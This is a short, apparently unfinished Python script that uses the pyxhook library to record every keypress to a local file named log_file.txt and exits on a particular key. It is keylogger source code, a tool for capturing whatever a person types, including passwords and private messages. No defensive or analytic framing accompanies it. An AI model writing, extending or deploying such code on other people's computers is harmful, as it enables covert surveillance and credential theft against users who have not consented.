import pyxhook
import sys



def OnKeyPress(event): #need to improve this, with space separation, backspace
    with open('log_file.txt', 'a') as f:
        f.write(event.Key+'\n')
        if event.Ascii == 127:   #need to set this to something distinct
            sys.exit()